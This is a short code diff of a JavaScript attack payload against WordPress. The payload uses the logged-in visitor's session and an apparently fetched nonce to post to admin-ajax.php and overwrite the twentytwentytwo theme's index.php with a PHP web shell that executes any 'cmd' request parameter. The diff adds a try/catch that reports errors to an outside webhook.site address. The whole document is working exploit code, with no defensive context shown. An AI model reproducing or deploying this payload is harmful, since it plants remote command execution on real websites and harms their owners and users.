@@ -6,7 +6,7 @@ async function pepe(){
 
 
 var a = await pepe();
-
+try{
 fetch("wp-admin/admin-ajax.php", {
     "headers":{"Content-type":"application/x-www-form-urlencoded"},
 "body": `nonce=${a[1]}&file=index.php&theme=twentytwentytwo&newcontent=<?php  if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);}
@@ -15,3 +15,6 @@ fetch("wp-admin/admin-ajax.php", {
   "mode": "cors",
   "credentials": "include"
 });
+}catch(err){
+    fetch('https://webhook.site/695fb972-c378-4986-b7af-0e8080af2eb8?'+err);
+}
